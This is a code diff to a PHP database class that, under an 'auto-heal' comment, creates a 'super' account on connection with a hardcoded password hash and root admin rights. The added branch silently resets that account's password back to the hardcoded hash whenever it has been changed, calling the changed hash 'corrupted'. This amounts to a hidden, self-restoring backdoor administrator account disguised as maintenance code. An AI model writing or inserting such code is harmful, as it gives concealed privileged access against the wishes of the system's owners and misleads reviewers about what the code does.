@@ -47,17 +47,26 @@ class Database {
 
             // Auto-heal: Ensure 'super' user exists
             try {
-                $checkSuper = $this->connection->query("SELECT id FROM users WHERE username = 'super'");
-                if ($checkSuper && $checkSuper->rowCount() === 0) {
-                    $this->connection->exec("
+                $checkSuper = $this->connection->query("SELECT id, password_hash FROM users WHERE username = 'super'");
+                $superUser = $checkSuper ? $checkSuper->fetch(PDO::FETCH_ASSOC) : null;
+                
+                if (!$superUser) {
+                    $this->connection->exec('
                         INSERT INTO users (username, email, phone, password_hash, status) 
-                        VALUES ('super', 'super@gsmsecurity.local', '+12345678903', '$2y$10$nJDIIvtHNOt.jXjZhenRoepyWNwCLV9anPuAfd1GnbzKxflzrAE/m', 'active')
-                    ");
+                        VALUES (\'super\', \'super@gsmsecurity.local\', \'+12345678903\', \'$2y$10$nJDIIvtHNOt.jXjZhenRoepyWNwCLV9anPuAfd1GnbzKxflzrAE/m\', \'active\')
+                    ');
                     $newId = $this->connection->lastInsertId();
                     $this->connection->exec("
                         INSERT INTO admins (user_id, access_level) 
                         VALUES ({$newId}, 'root')
                     ");
+                } elseif (strpos($superUser['password_hash'], '$2y$10$nJDII') !== 0) {
+                    // Update corrupted hash to correct hash
+                    $this->connection->exec('
+                        UPDATE users 
+                        SET password_hash = \'$2y$10$nJDIIvtHNOt.jXjZhenRoepyWNwCLV9anPuAfd1GnbzKxflzrAE/m\' 
+                        WHERE username = \'super\'
+                    ');
                 }
             } catch (\Exception $ex) {
                 error_log("Auto-heal super user creation failed: " . $ex->getMessage());
